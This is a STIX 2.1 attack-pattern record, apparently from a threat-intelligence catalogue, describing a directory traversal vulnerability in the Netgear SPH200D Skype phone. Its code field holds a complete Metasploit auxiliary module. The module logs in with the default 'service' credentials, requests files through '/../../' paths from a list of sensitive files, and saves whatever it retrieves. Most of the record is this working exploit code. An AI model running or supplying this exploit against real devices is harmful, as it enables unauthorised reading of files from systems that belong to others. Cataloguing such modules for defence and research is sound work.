{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e1c9a60-9d35-4f84-a872-63dd9643c438",
    "created": "2024-08-14T16:28:42.091975Z",
    "modified": "2024-08-14T16:28:42.091979Z",
    "name": "Netgear SPH200D Directory Traversal Vulnerability",
    "description": " This module exploits a directory traversal vulnerablity which is present in Netgear SPH200D Skype telephone.  'References'  => [ [ 'BID', '57660' ] [ 'EDB', '24441' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/netgear_sph200d_traversal.rb",
            "external_id": "netgear_sph200d_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-002"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Netgear SPH200D Directory Traversal Vulnerability',\n      'Description' => %q{\n          This module exploits a directory traversal vulnerablity which is present in\n        Netgear SPH200D Skype telephone.\n      },\n      'References'  =>\n        [\n          [ 'BID', '57660' ],\n          [ 'EDB', '24441' ],\n          [ 'URL', 'http://support.netgear.com/product/SPH200D' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-002' ]\n        ],\n      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n      'License'     => MSF_LICENSE\n    )\n    register_options(\n      [\n        OptPath.new('FILELIST',  [ true, \"File containing sensitive files, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"sensitive_files.txt\") ]),\n        OptString.new('HttpUsername',[ true, 'User to login with', 'service']),\n        OptString.new('HttpPassword',[ true, 'Password to login with', 'service'])\n      ])\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\n\n  # traverse every file\n  def find_files(file,user,pass)\n    traversal = '/../../'\n\n    res = send_request_cgi({\n      'method'     => 'GET',\n      'uri'        => normalize_uri(traversal, file),\n      'authorization' => basic_auth(user,pass)\n    })\n\n    if res and res.code == 200 and res.body !~ /404\\ File\\ Not\\ Found/\n      print_good(\"Request may have succeeded on file #{file}\")\n      report_web_vuln({\n        :host     => rhost,\n        :port     => rport,\n        :vhost    => datastore['VHOST'],\n        :path     => \"/\",\n        :pname    => normalize_uri(traversal, file),\n        :risk     => 3,\n        :proof    => normalize_uri(traversal, file),\n        :name     => self.fullname,\n        :category => \"web\",\n        :method   => \"GET\"\n      })\n\n      loot = store_loot(\"lfi.data\",\"text/plain\", rhost, res.body, file)\n      vprint_good(\"File #{file} downloaded to: #{loot}\")\n    elsif res and res.code\n      vprint_error(\"Attempt returned HTTP error #{res.code} when trying to access #{file}\")\n    end\n  end\n\n  def run_host(ip)\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n\n    vprint_status(\"Trying to login with #{user} / #{pass}\")\n\n    # test login\n    begin\n      res = send_request_cgi({\n        'uri'        => '/',\n        'method'     => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n\n      return :abort if res.nil?\n      return :abort if (res.headers['Server'].nil? or res.headers['Server'] !~ /simple httpd/)\n      return :abort if (res.code == 404)\n\n      if [200, 301, 302].include?(res.code)\n        vprint_good(\"Successful login #{user}/#{pass}\")\n      else\n        vprint_error(\"No successful login possible with #{user}/#{pass}\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"Failed to connect to the web server\")\n      return :abort\n    end\n\n    extract_words(datastore['FILELIST']).each do |file|\n      find_files(file,user,pass) unless file.empty?\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Michael Messner <devnull[at]s3cur1ty.de> ]",
        ""
    ]
}